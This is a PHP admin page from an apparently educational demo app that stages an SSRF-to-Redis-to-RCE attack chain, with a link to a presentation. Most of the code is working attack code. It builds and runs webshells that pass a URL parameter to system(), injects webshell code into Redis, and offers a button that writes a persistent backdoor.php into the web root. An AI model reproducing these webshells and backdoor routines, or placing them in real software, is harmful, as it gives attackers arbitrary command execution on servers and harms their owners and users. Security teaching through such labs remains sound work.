<?php
require_once __DIR__ . '/../src/bootstrap.php';

$sid = $_COOKIE['SID'] ?? '';
if(!$sid){
    header('Location: login.php');
    exit;
}

$user_json = $redis->get("session_$sid");
$user = $user_json ? json_decode($user_json,true) : null;

if(!$user || ($user['role'] ?? '') !== 'admin'){
    http_response_code(403);
    echo "Forbidden";
    exit;
}

echo "<h1>ADMIN PANEL - RCE DEMONSTRATION</h1>";

// ================ REAL RCE VULNERABILITY ================
$webshell_key = "session_webshell_demo";
$webshell_content = $redis->get($webshell_key);

if ($webshell_content && isset($_GET['execute'])) {
    echo "<div style='background:#ffebee; border:3px solid red; padding:15px; margin:20px 0;'>";
    echo "<h2 style='color:red'>⚠️ REAL RCE EXECUTION ⚠️</h2>";
    
    if ($_GET['execute'] === 'eval') {
        // ⚠️ DIRECT EVAL - MOST DANGEROUS
        echo "<p><strong>Executing Redis content via eval():</strong></p>";
        echo "<pre style='background:#f5f5f5; padding:10px;'>";
        echo htmlspecialchars($webshell_content);
        echo "</pre>";
        
        // Get command from URL or use default
        $cmd = $_GET['cmd'] ?? 'whoami';
        echo "<p><strong>Command to execute:</strong> <code>" . htmlspecialchars($cmd) . "</code></p>";
        
        // Execute the PHP code from Redis
        echo "<hr><h3>Output:</h3>";
        echo "<pre style='background:black; color:lime; padding:10px;'>";
        
        // Create a safe wrapper for the webshell
        $code_to_execute = "<?php\n";
        $code_to_execute .= "if (isset(\$_GET['cmd'])) {\n";
        $code_to_execute .= "    echo '<pre style=\"background:black;color:lime;padding:10px;\">';\n";
        $code_to_execute .= "    system(\$_GET['cmd']);\n";
        $code_to_execute .= "    echo '</pre>';\n";
        $code_to_execute .= "} else {\n";
        $code_to_execute .= "    echo 'Webshell ready. Use ?cmd=command';\n";
        $code_to_execute .= "}\n";
        $code_to_execute .= "?>";
        
        eval('?>' . $code_to_execute);
        echo "</pre>";
    }
    
    // Alternative: Write to file and include
    elseif ($_GET['execute'] === 'file') {
        $temp_file = '/tmp/webshell_' . bin2hex(random_bytes(8)) . '.php';
        
        // Fix the webshell content to handle cmd properly
        $fixed_content = "<?php\n";
        $fixed_content .= "if (isset(\$_GET['cmd'])) {\n";
        $fixed_content .= "    echo '<pre>';\n";
        $fixed_content .= "    system(\$_GET['cmd']);\n";
        $fixed_content .= "    echo '</pre>';\n";
        $fixed_content .= "} else {\n";
        $fixed_content .= "    echo 'Ready for commands. Use ?cmd=whoami';\n";
        $fixed_content .= "}\n";
        $fixed_content .= "?>";
        
        file_put_contents($temp_file, $fixed_content);
        
        echo "<p><strong>File created:</strong> " . htmlspecialchars($temp_file) . "</p>";
        
        if (isset($_GET['cmd'])) {
            echo "<h3>Command Output:</h3>";
            echo "<pre style='background:black; color:lime; padding:10px;'>";
            include($temp_file);
            echo "</pre>";
        } else {
            echo "<p><a href='?execute=file&cmd=whoami'>Test with: whoami</a></p>";
        }
        
        // Cleanup
        register_shutdown_function(function() use ($temp_file) {
            if (file_exists($temp_file)) {
                unlink($temp_file);
            }
        });
    }
    
    // Create permanent backdoor
    elseif ($_GET['execute'] === 'persist') {
        $backdoor_content = "<?php\n";
        $backdoor_content .= "// Persistent backdoor\n";
        $backdoor_content .= "if (isset(\$_GET['cmd'])) {\n";
        $backdoor_content .= "    echo '<pre style=\"background:black;color:lime;padding:10px;\">';\n";
        $backdoor_content .= "    system(\$_GET['cmd']);\n";
        $backdoor_content .= "    echo '</pre>';\n";
        $backdoor_content .= "}\n";
        $backdoor_content .= "echo '<h3>Backdoor Active</h3>';\n";
        $backdoor_content .= "echo '<p>Use ?cmd=command</p>';\n";
        $backdoor_content .= "?>";
        
        $backdoor_file = '/var/www/html/backdoor.php';
        if (file_put_contents($backdoor_file, $backdoor_content)) {
            echo "<p><strong>✅ Persistent backdoor created!</strong></p>";
            echo "<p><a href='/backdoor.php?cmd=whoami' target='_blank'>Access backdoor.php</a></p>";
            echo "<p><strong>File location:</strong> " . htmlspecialchars($backdoor_file) . "</p>";
        } else {
            echo "<p style='color:red'>Failed to create backdoor. Check permissions.</p>";
        }
    }
    echo "</div>";
}
// ================ END RCE VULNERABILITY ================

// ================ SAFE DEMONSTRATION ================
echo "<div style='background:#e8f5e9; border:2px solid #4caf50; padding:15px; margin:20px 0;'>";
echo "<h3>🧪 Educational Demonstration</h3>";

// Check if webshell exists
$webshell_check = $redis->get("session_webshell_demo");
if ($webshell_check !== false && $webshell_check !== null) {
    echo "<p><strong>✅ Webshell found in Redis</strong></p>";
    echo "<pre style='background:white; padding:10px;'>" . htmlspecialchars($webshell_check) . "</pre>";
    
    echo "<h4>Try these RCE demonstrations:</h4>";
    echo "<ul>";
    echo "<li><a href='?execute=eval&cmd=whoami'>Execute: whoami</a> (Current user)</li>";
    echo "<li><a href='?execute=eval&cmd=id'>Execute: id</a> (User/group info)</li>";
    echo "<li><a href='?execute=eval&cmd=pwd'>Execute: pwd</a> (Current directory)</li>";
    echo "<li><a href='?execute=eval&cmd=ls -la'>Execute: ls -la</a> (List files)</li>";
    echo "<li><a href='?execute=file&cmd=whoami'>Execute via file include</a></li>";
    echo "<li><a href='?execute=persist'>Create persistent backdoor</a></li>";
    echo "</ul>";
} else {
    echo "<p style='color:orange'>❌ No webshell found in Redis.</p>";
    echo "<p>But you verified Redis has it - the admin.php just needs to use it!</p>";
}
echo "</div>";
// ================ END SAFE DEMO ================

// Current Redis dump
echo "<h3>Redis Session Dump:</h3>";
echo "<pre style='background:#f5f5f5; padding:10px;'>";
$keys_to_check = ['session_webshell_demo', 'session_admin_from_ssrf'];

foreach ($keys_to_check as $key) {
    $val = $redis->get($key);
    if ($val === false || $val === null) {
        echo htmlspecialchars($key) . " => (not found)\n";
    } else {
        $display = strlen($val) > 100 ? substr($val, 0, 100) . "..." : $val;
        echo htmlspecialchars($key) . " => " . htmlspecialchars($display) . "\n";
    }
}
echo "</pre>";

// ================ CREATE inject_demo.php FOR QUICK SETUP ================
if (isset($_POST['action']) && $_POST['action'] === 'inject') {
    // Inject a proper webshell
    $proper_webshell = '<?php
if (isset($_GET["cmd"])) {
    echo "<pre style=\"background:black;color:lime;padding:10px;\">";
    system($_GET["cmd"]);
    echo "</pre>";
} else {
    echo "<h3>Webshell Ready</h3>";
    echo "<p>Use ?cmd=command</p>";
}
?>';
    
    $redis->set("session_webshell_demo", $proper_webshell);
    echo "<script>alert('Webshell injected! Refresh page.'); location.reload();</script>";
}
// ================ END INJECTION HANDLER ================

// ================ DEMONSTRATION GUIDE ================
echo "<div style='background:#e3f2fd; border:2px solid #2196f3; padding:15px; margin:20px 0;'>";
echo "<h3>📚 Complete Attack Chain</h3>";

echo "<table border='1' cellpadding='10' style='width:100%; border-collapse:collapse;'>";
echo "<tr style='background:#bbdefb;'><th>Step</th><th>Action</th><th>Status</th></tr>";

// Check Step 1: SSRF Admin Session
$admin_session = $redis->get("session_admin_from_ssrf");
echo "<tr>";
echo "<td>1</td>";
echo "<td>SSRF → Redis Admin Session</td>";
echo "<td>";
if ($admin_session !== false && $admin_session !== null) {
    echo "✅ Already done (session_admin_from_ssrf exists)";
} else {
    echo "❌ Not yet - run: <code>python3 ssrf_admin_takeover.py</code>";
}
echo "</td>";
echo "</tr>";

// Check Step 2: Webshell in Redis
echo "<tr>";
echo "<td>2</td>";
echo "<td>Inject PHP Webshell into Redis</td>";
echo "<td>";
if ($webshell_check !== false && $webshell_check !== null) {
    echo "✅ Webshell ready in session_webshell_demo";
} else {
    echo "❌ Not injected - <form method='post' style='display:inline;'>
            <input type='hidden' name='action' value='inject'>
            <button type='submit' style='background:#4caf50;color:white;border:none;padding:5px 10px;cursor:pointer;'>
                Inject Now
            </button>
          </form>";
}
echo "</td>";
echo "</tr>";

// Check Step 3: RCE Execution
echo "<tr>";
echo "<td>3</td>";
echo "<td>Execute RCE via eval()</td>";
echo "<td>";
if ($webshell_check !== false && $webshell_check !== null) {
    echo "✅ Ready - <a href='?execute=eval&cmd=whoami'>Test RCE</a>";
} else {
    echo "⏳ Inject webshell first";
}
echo "</td>";
echo "</tr>";
echo "</table>";

echo "<h4>Quick Test Links:</h4>";
echo "<div style='display:flex; gap:10px; flex-wrap:wrap;'>";
echo "<a href='?execute=eval&cmd=whoami' style='background:#4caf50;color:white;padding:8px 15px;text-decoration:none;border-radius:4px;'>whoami</a>";
echo "<a href='?execute=eval&cmd=id' style='background:#2196f3;color:white;padding:8px 15px;text-decoration:none;border-radius:4px;'>id</a>";
echo "<a href='?execute=eval&cmd=pwd' style='background:#ff9800;color:white;padding:8px 15px;text-decoration:none;border-radius:4px;'>pwd</a>";
echo "<a href='?execute=eval&cmd=ls -la' style='background:#9c27b0;color:white;padding:8px 15px;text-decoration:none;border-radius:4px;'>ls -la</a>";
echo "<a href='?execute=persist' style='background:#f44336;color:white;padding:8px 15px;text-decoration:none;border-radius:4px;'>Create Backdoor</a>";
echo "</div>";
echo "</div>";

// ================ PRESENTATION LINK ================
echo "<div style='position: fixed; top: 10px; right: 10px; z-index: 1000;'>
    <a href='presentation.php' 
       target='_blank'
       style='background: linear-gradient(45deg, #ff0080, #00d4ff);
              color: white;
              padding: 10px 20px;
              border-radius: 50px;
              text-decoration: none;
              font-weight: bold;
              box-shadow: 0 5px 20px rgba(0,0,0,0.3);'>
       🎤 Start Presentation
    </a>
</div>";

// Add JavaScript for better UX
echo "<script>
function confirmRCE(action) {
    if (confirm('⚠️ This will execute ' + action + '. Continue?')) {
        return true;
    }
    return false;
}
</script>";
?>

<?php require_once __DIR__ . '/../templates/header.php'; ?>
<?php require_once __DIR__ . '/../templates/footer.php'; ?>